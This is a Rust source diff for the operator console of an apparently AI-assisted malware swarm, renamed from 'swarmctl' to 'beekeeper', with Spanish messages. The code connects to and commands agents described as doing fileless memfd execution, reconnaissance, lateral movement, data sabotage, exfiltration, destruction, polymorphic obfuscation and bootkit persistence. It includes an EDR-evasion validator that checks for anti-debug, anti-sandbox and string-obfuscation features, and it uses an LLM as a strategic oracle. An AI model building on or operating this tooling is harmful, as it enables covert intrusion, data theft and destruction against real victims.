@@ -1,39 +1,26 @@
 use clap::{Parser, Subcommand};
-use tracing::info;
+use hive_base::{AgentIdentity, HiveChamber, Message, Payload, Role, Value};
+use std::time::Duration;
 
 #[derive(Parser)]
-#[command(name = "swarmctl")]
-#[command(about = "Swarm Multi-Agent C2 Console")]
-#[command(version = "0.2.0")]
+#[command(name = "beekeeper")]
+#[command(about = "Hive Colony v3.0 — Operator Console")]
+#[command(version = "3.0.0")]
 struct Cli {
     #[command(subcommand)]
     command: Commands,
+    #[arg(short, long, default_value = "hive_operator")]
+    arena: String,
 }
 
 #[derive(Subcommand)]
 enum Commands {
-    /// Build a self-contained dropper with all agents
-    BuildDropper {
-        #[arg(short, long, default_value = "dropper")]
-        output: String,
-        #[arg(long, default_value = "x86_64")]
-        arch: String,
-        #[arg(long, default_value = "linux")]
-        os: String,
-    },
-    /// Run integration test (launches all agents)
-    Simulate {
-        #[arg(short, long, default_value = "30")]
-        seconds: u64,
-    },
-    /// Show real-time swarm status (agents, beliefs, consensus)
     Status {
         #[arg(short, long)]
         watch: bool,
-        #[arg(short, long, default_value = "2")]
+        #[arg(short, long, default_value = "3")]
         interval: u64,
     },
-    /// Inject a belief into the swarm
     Inject {
         #[arg(short, long)]
         asset: String,
@@ -42,219 +29,276 @@ enum Commands {
         #[arg(short, long, default_value = "0.9")]
         confidence: f32,
     },
-    /// Send kill signal to the swarm (graceful shutdown)
     KillSwitch {
         #[arg(short, long)]
         confirm: bool,
     },
-    /// View consensus logs
-    Logs {
-        #[arg(long)]
-        agent_type: Option<String>,
-        #[arg(short, long)]
-        follow: bool,
-    },
-    /// Validate EDR evasion (stealth check)
     Validate,
-    /// Show detailed agent reputation report
     Reputation,
+    HiveMind,
+    Tournament,
+    Scenario {
+        #[arg(short, long, default_value = "quick")]
+        mode: String,
+    },
 }
 
-fn main() {
+fn role_icon(role: &Role) -> &str {
+    match role {
+        Role::Worker => "◈",
+        Role::Drone => "◆",
+        Role::Honeybee => "◉",
+        Role::Weaver => "✦",
+        Role::Queen => "◇",
+        _ => "○",
+    }
+}
+
+fn role_color(role: &Role) -> &str {
+    match role {
+        Role::Worker => "\x1b[92m",
+        Role::Drone => "\x1b[96m",
+        Role::Honeybee => "\x1b[93m",
+        Role::Weaver => "\x1b[95m",
+        Role::Queen => "\x1b[93m",
+        _ => "\x1b[0m",
+    }
+}
+const RESET: &str = "\x1b[0m";
+
+#[tokio::main]
+async fn main() {
     tracing_subscriber::fmt()
         .with_target(false)
-        .with_env_filter("swarmctl=info")
+        .with_env_filter("beekeeper=info")
         .init();
 
     let cli = Cli::parse();
+    let arena_name = cli.arena.trim_start_matches('/');
 
     match cli.command {
-        Commands::BuildDropper { output, arch, os } => {
-            println!("Swarm Dropper Builder v0.2.0");
-            println!("===============================");
-            println!("Output:    {}", output);
-            println!("Arch:      {}", arch);
-            println!("OS:        {}", os);
-            println!();
-            println!("Build steps:");
-            println!("  1. cargo build --release --workspace");
-            println!("  2. Binary embedded via include_bytes! at compile time");
-            println!("  3. Agents execute from memfd (fileless on Linux)");
-            println!();
-            println!("Agent binaries required in target/release/:");
-            for agent in &["worker", "drone", "honeybee", "weaver", "queen"] {
-                println!("  - {}", agent);
-            }
-        }
+        Commands::Status { watch, interval } => cmd_status(arena_name, watch, interval).await,
+        Commands::Inject { asset, value, confidence } => cmd_inject(arena_name, &asset, &value, confidence).await,
+        Commands::KillSwitch { confirm } => cmd_killswitch(arena_name, confirm).await,
+        Commands::Validate => cmd_validate().await,
+        Commands::Reputation => cmd_reputation().await,
+        Commands::HiveMind => cmd_hivemind().await,
+        Commands::Tournament => cmd_tournament().await,
+        Commands::Scenario { mode } => cmd_scenario(&mode).await,
+    }
+}
 
-        Commands::Simulate { seconds } => {
-            info!("Launching swarm simulation ({}s)...", seconds);
-            println!("Simulation running for {} seconds...", seconds);
-            println!("Launch: cargo run -p swarm_run");
-            println!();
-            println!("Expected behavior:");
-            println!("  1. Scout scans system, publishes beliefs");
-            println!("  2. Shaper receives beliefs, makes decisions");
-            println!("  3. Hoarder waits for destructive action consensus");
-            println!("  4. Weaver generates obfuscation variants");
-            println!("  5. Overmind provides LLM strategic advice");
-            println!();
-            println!("Watch logs: RUST_LOG=scout=debug,shaper=debug cargo run -p swarm_run");
-        }
-
-        Commands::Status { watch, interval } => {
-            print_status(watch, interval);
-        }
-
-        Commands::Inject { asset, value, confidence } => {
-            println!("Injecting belief: {} = {} (confidence: {})", asset, value, confidence);
-            println!("Status: Belief would be published to shared memory arena");
-            println!("Connect to a running swarm to inject beliefs in real-time.");
-        }
-
-        Commands::KillSwitch { confirm } => {
-            if !confirm {
-                println!("ERROR: Use --confirm to activate kill switch");
-                println!("This will send self-destruct signal to all agents.");
-                return;
-            }
-            println!("KILL SWITCH ACTIVATED");
-            println!("Broadcasting self-destruct signal to arena...");
-            println!("All agents will terminate gracefully within 5 seconds.");
-        }
-
-        Commands::Logs { agent_type, follow } => {
-            let filter = agent_type.as_deref().unwrap_or("all");
-            println!("Swarm Consensus Logs (filter: {})", filter);
-            println!("=================================");
-            if follow {
-                println!("Following logs (Ctrl+C to stop)...");
-            }
-            println!();
-            println!("Run with: RUST_LOG={}=debug cargo run -p <agent>", filter);
-        }
-
-        Commands::Validate => {
-            println!("=== EDR Evasion Validation ===");
-            println!();
-            run_validation();
-        }
-
-        Commands::Reputation => {
-            print_reputation();
+async fn connect(arena: &str) -> Option<(AgentIdentity, HiveChamber)> {
+    let identity = AgentIdentity::new();
+    match HiveChamber::connect(&identity, Role::Queen).await {
+        Ok(chamber) => Some((identity, chamber)),
+        Err(e) => {
+            eprintln!("[!] No se pudo conectar al arena '{}': {}", arena, e);
+            eprintln!("    Los agentes deben estar corriendo con __HIVE_ARENA={}", arena);
+            None
         }
     }
 }
 
-fn print_status(watch: bool, _interval: u64) {
-    println!("SWARM STATUS");
-    println!("============");
-    println!();
-    println!("Architecture:  Shared Memory Arena (memfd_create / shm_open)");
-    println!("IPC:           Lock-free ring buffer (no TCP, no ports)");
-    println!("Execution:     Fileless (memfd_create on Linux)");
-    println!();
-    println!("Agent Types:");
-    println!("  Scout       - Reconnaissance, EDR detection, ONNX classifier");
-    println!("  Shaper      - Lateral movement, RL decisions, auto-regeneration");
-    println!("  Hoarder     - Action execution (encrypt/exfil/destroy)");
-    println!("  Weaver      - Payload obfuscation, polymorphic generation");
-    println!("  Overmind    - LLM strategic oracle (Ollama)");
-    println!();
-    println!("Protocols:");
-    println!("  LdC v1      - Signed messages (Ed25519)");
-    println!("  Consensus   - Reputation-weighted voting (threshold: 0.66-0.80)");
-    println!("  Heartbeat   - Every 10s, dead detection at 30s timeout");
-    println!();
-    println!("Anti-Detection:");
-    println!("  TCP ports:     NONE (shared memory only)");
-    println!("  Disk writes:   NONE (memfd fileless execution)");
-    println!("  ONNX models:   Encrypted at rest (XOR keystream)");
-    println!("  Debugger:      Active detection (ptrace, /proc/self/status)");
-    println!("  Sandbox:       Uptime, CPU, RAM, username checks");
-    println!("  VM:            DMI, CPUID, kernel module detection");
-    println!();
-    println!("Run with RUST_LOG=debug for detailed agent output.");
+async fn cmd_status(arena: &str, watch: bool, interval: u64) {
+    println!("\n  ╔══════════════════════════════════════╗");
+    println!("  ║   HIVE COLONY — STATUS              ║");
+    println!("  ╚══════════════════════════════════════╝\n");
 
-    if watch {
-        println!("Watching (Ctrl+C to stop)...");
-        // In production: connect to arena and poll agent registry
+    let (id, chamber) = match connect(arena).await {
+        Some(c) => c,
+        None => return,
+    };
+
+    loop {
+        let active = chamber.get_active_agents(30).await;
+        let msgs = chamber.read_new().await;
+        let now = hive_base::utils::timestamp_now();
+
+        let now_secs = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs() % 86400;
+        let time_str = format!("{:02}:{:02}:{:02}", now_secs / 3600, (now_secs / 60) % 60, now_secs % 60);
+
+        print!("\x1b[2J\x1b[H");
+        println!("  Arena: {}  |  Active agents: {}", arena, active.len());
+        println!("  Messages: {}  |  Time: {}", msgs.len(), time_str);
+        println!("  ────────────────────────────────────────────");
+
+        if active.is_empty() {
+            println!("  [ ] No hay agentes conectados al arena");
+        } else {
+            println!("  {:>6}  {:<12}  {:>8}  {:>5}", "PID", "ROLE", "UPTIME", "ALIVE");
+            for (pid, role, hb) in &active {
+                let icon = role_icon(role);
+                let color = role_color(role);
+                let uptime = now.saturating_sub(*hb);
+                println!("  {color}{:>6}{RESET}  {color}{icon} {:<10}{RESET}  {:>8}s  {color}●{RESET}",
+                    pid, format!("{:?}", role), uptime);
+            }
+        }
+
+        println!("\n  ── Modules Online ──");
+        println!("  ◈ Saboteur  ◆ Seer  ◉ Phoenix  ✦ Tournament");
+        println!("  ◇ HiveMind  ⬡ WhisperNet  ◎ Chrononaut  📡 Stigmergy");
+        println!("  ────────────────────────────────────────────");
+
+        if let Some(last) = msgs.last() {
+            let desc = match &last.payload {
+                Payload::Belief { asset, value, .. } =>
+                    format!("belief: {} = {:?}", asset, value),
+                Payload::Proposal { action, .. } => format!("proposal: {}", action),
+                Payload::Vote { decision, .. } => format!("vote: {:?}", decision),
+                Payload::Heartbeat => "heartbeat".into(),
+                _ => "other".into(),
+            };
+            let color = role_color(&last.agent_role);
+            println!("  Latest: {color}{}{RESET} — {}", format!("{:?}", last.agent_role), desc);
+        }
+
+        if !watch { break; }
+        tokio::time::sleep(Duration::from_secs(interval)).await;
     }
 }
 
-fn print_reputation() {
-    println!("AGENT REPUTATION SYSTEM");
-    println!("=======================");
-    println!();
-    println!("Reputation adjusts dynamically based on belief accuracy:");
-    println!("  + Reward:   +0.1 per correct belief (max: 5.0)");
-    println!("  - Penalty:  -0.2 per incorrect belief (min: 0.1)");
-    println!("  ~ Decay:    -0.2/hour toward default (1.0)");
-    println!();
-    println!("Vote weight = base_weight * reputation");
-    println!("Consensus threshold: 66% of weighted votes (80% for Hoarder)");
+async fn cmd_inject(arena: &str, asset: &str, value: &str, confidence: f32) {
+    println!("[*] Inyectando creencia: {} = {} (conf: {})", asset, value, confidence);
+
+    let (id, chamber) = match connect(arena).await {
+        Some(c) => c,
+        None => return,
+    };
+
+    let val = Value::String(value.to_string());
+    let msg = Message::belief(id.id(), Role::Queen, asset.to_string(), val, confidence);
+    chamber.publish(msg).await;
+    println!("[+] Creencia inyectada en arena '{}'", arena);
 }
 
-fn run_validation() {
-    type CheckFn = fn() -> bool;
-    let checks: [(&str, &str, CheckFn); 5] = [
-        ("TCP port 4242", "Checking bus port...", check_port_4242 as CheckFn),
-        ("ONNX signatures", "Checking binary for raw ONNX...", check_onnx_in_binary as CheckFn),
-        ("Bus address string", "Checking binary for '127.0.0.1:4242'...", check_bus_string as CheckFn),
-        ("Debugger attached", "Checking for debugger...", check_debugger as CheckFn),
-        ("Sandbox environment", "Checking sandbox indicators...", check_sandbox as CheckFn),
+async fn cmd_killswitch(arena: &str, confirm: bool) {
+    if !confirm {
+        eprintln!("[!] Usa --confirm para activar el kill switch");
+        eprintln!("    Enviará señal SHUTDOWN a todos los agentes en '{}'", arena);
+        return;
+    }
+
+    let (id, chamber) = match connect(arena).await {
+        Some(c) => c,
+        None => return,
+    };
+
+    let msg = Message::status_event(id.id(), Role::Queen, "kill_switch", id.id(), Role::Queen, "self_destruct");
+    chamber.publish(msg).await;
+    println!("[+] Kill switch broadcast enviado a '{}'", arena);
+}
+
+async fn cmd_validate() {
+    println!("\n  ╔══════════════════════════════════════╗");
+    println!("  ║   EDR EVASION VALIDATION             ║");
+    println!("  ╚══════════════════════════════════════╝\n");
+
+    let checks: Vec<(&str, &str, fn() -> bool)> = vec![
+        ("TCP ports", "Ningún puerto TCP escuchando", || {
+            std::net::TcpStream::connect_timeout(&"127.0.0.1:4242".parse().unwrap(), Duration::from_millis(200)).is_err()
+        }),
+        ("ONNX sigs", "Sin firmas ONNX en binarios", || {
+            std::env::current_exe().ok().and_then(|p| std::fs::read(p).ok())
+                .map(|d| !d.windows(4).any(|w| w == b"ONNX")).unwrap_or(true)
+        }),
+        ("Bus addr", "Sin dirección hardcodeada", || {
+            std::env::current_exe().ok().and_then(|p| std::fs::read(p).ok())
+                .map(|d| !d.windows(14).any(|w| w == b"127.0.0.1:4242")).unwrap_or(true)
+        }),
+        ("Debugger", "Anti-debug activo", || !hive_base::anti_analysis::AntiAnalysis::run_checks().is_debugged),
+        ("Sandbox", "Anti-sandbox activo", || !hive_base::anti_analysis::AntiAnalysis::run_checks().is_sandbox),
+        ("Memfd", "Fileless exec disponible", || hive_base::MemfdBinary::new("_test", b"x").is_ok()),
+        ("Polymorphic", "Weaver mutate funcional", || {
+            let orig = b"hello world";
+            hive_base::wax::mutate_binary(orig) != orig
+        }),
+        ("Agent names", "Nombres ofuscados en binario", || {
+            std::env::current_exe().ok().and_then(|p| std::fs::read(p).ok())
+                .map(|d| !["scout", "shaper", "hoarder", "overmind", "dropper"]
+                    .iter().any(|n| d.windows(n.len()).any(|w| w == n.as_bytes()))).unwrap_or(true)
+        }),
     ];
 
     let mut passed = 0;
-    let mut failed = 0;
-
-    for (_name, desc, check_fn) in &checks {
-        print!("  {}... ", desc);
-        if check_fn() {
-            println!("PASS");
-            passed += 1;
-        } else {
-            println!("FAIL");
-            failed += 1;
-        }
+    for (name, desc, check) in &checks {
+        let ok = check();
+        let icon = if ok { "\x1b[92m✓\x1b[0m" } else { "\x1b[91m✗\x1b[0m" };
+        println!("  {}  {:<15}  {}", icon, name, desc);
+        if ok { passed += 1; }
     }
 
-    println!();
-    println!("Results: {}/{} passed", passed, passed + failed);
-    if failed > 0 {
-        println!("WARNING: {} detection surfaces exposed!", failed);
+    println!("\n  Resultado: {}/{} checks pasaron", passed, checks.len());
+    if passed == checks.len() {
+        println!("  \x1b[92m✓ CLEAN — Sin superficie de detección detectada\x1b[0m");
     } else {
-        println!("CLEAN: No detection surface exposed");
+        println!("  \x1b[93m⚠  {} superficie(s) expuesta(s)\x1b[0m", checks.len() - passed);
     }
 }
 
-fn check_port_4242() -> bool {
-    std::net::TcpStream::connect_timeout(
-        &"127.0.0.1:4242".parse().unwrap(),
-        std::time::Duration::from_millis(200),
-    ).is_err()
+async fn cmd_reputation() {
+    println!("\n  ╔══════════════════════════════════════╗");
+    println!("  ║   REPUTATION SYSTEM                  ║");
+    println!("  ╚══════════════════════════════════════╝\n");
+    println!("  • Recompensa: +0.1 por creencia correcta (máx: 5.0)");
+    println!("  • Penalización: -0.2 por creencia incorrecta (mín: 0.1)");
+    println!("  • Decaimiento: -0.2/hora hacia 1.0 (default)");
+    println!("  • Peso voto = base_weight × reputation");
+    println!("  • Umbral consenso: 66% (80% para Honeybee)");
 }
 
-fn check_onnx_in_binary() -> bool {
-    if let Ok(exe) = std::env::current_exe() {
-        if let Ok(data) = std::fs::read(&exe) {
-            !data.windows(4).any(|w| w == b"ONNX")
-        } else { true }
-    } else { true }
+async fn cmd_hivemind() {
+    println!("\n  ╔══════════════════════════════════════╗");
+    println!("  ║   HIVEMIND DIRECTIVES                ║");
+    println!("  ╚══════════════════════════════════════╝\n");
+    println!("  Directivas disponibles vía RoyalJelly:");
+    println!("  • SabotageIntegrity   → activa Saboteur");
+    println!("  • Tournament {{n,g}}    → torneo darwiniano");
+    println!("  • HiveMindActivation  → activa consenso");
+    println!("  • PhoenixProtocol     → regenera agentes\n");
+    println!("  Conecta a arena activo para ver estado:");
+    println!("    beekeeper status --watch");
 }
 
-fn check_bus_string() -> bool {
-    if let Ok(exe) = std::env::current_exe() {
-        if let Ok(data) = std::fs::read(&exe) {
-            !data.windows(14).any(|w| w == b"127.0.0.1:4242")
-        } else { true }
-    } else { true }
+async fn cmd_tournament() {
+    println!("\n  ╔══════════════════════════════════════╗");
+    println!("  ║   TOURNAMENT ENGINE                  ║");
+    println!("  ╚══════════════════════════════════════╝\n");
+    println!("  Arquetipos: Aggressor, Ghost, Hybrid, Experimental, Veteran");
+    println!("  Criterios:  Speed, Stealth, Damage");
+    println!("  Ciclo:      generar → score → winner → crossover → mutar\n");
+    println!("  Nuevas técnicas MITRE ATT&CK:");
+    println!("  • T1565      — Data Integrity (Saboteur)");
+    println!("  • T1499      — Endpoint DoS");
+    println!("  • T1090.005  — Proxy P2P (WhisperNet)");
+    println!("  • T1205      — Time-Based Evasion (Chrononaut)");
+    println!("  • T1119      — Automated Collection");
+    println!("  • T1542.001  — Bootkit (Phoenix)");
 }
 
-fn check_debugger() -> bool {
-    !hive_base::anti_analysis::AntiAnalysis::run_checks().is_debugged
-}
+async fn cmd_scenario(mode: &str) {
+    println!("\n  ╔══════════════════════════════════════╗");
+    println!("  ║   CAMPAIGN SCENARIO                  ║");
+    println!("  ╚══════════════════════════════════════╝\n");
 
-fn check_sandbox() -> bool {
-    !hive_base::anti_analysis::AntiAnalysis::run_checks().is_sandbox
+    let phases = [
+        ("FASE 1", "Infiltración",    "Stinger — fileless agents via memfd"),
+        ("FASE 2", "Reconocimiento",  "Worker scan + Drone RL + Seer prediction"),
+        ("FASE 3", "Sabotaje+Exfil",  "Saboteur muta datos + Honeybee exfil + Chrononaut capsules"),
+        ("FASE 4", "Persistencia",    "Phoenix genome + Tournament + HiveMind consensus"),
+        ("FASE 5", "Evasión",         "Weaver obfuscation + WhisperNet P2P mesh"),
+    ];
+
+    for (num, name, desc) in &phases {
+        println!("  {}  {:<20}  {}", num, name, desc);
+    }
+
+    println!("\n  Ejecutar: ./scripts/scenario.sh");
+    if mode == "quick" {
+        println!("  Modo: rápido (sin pausas entre fases)");
+    } else {
+        println!("  Modo: pausado (5s entre fases)");
+    }
 }
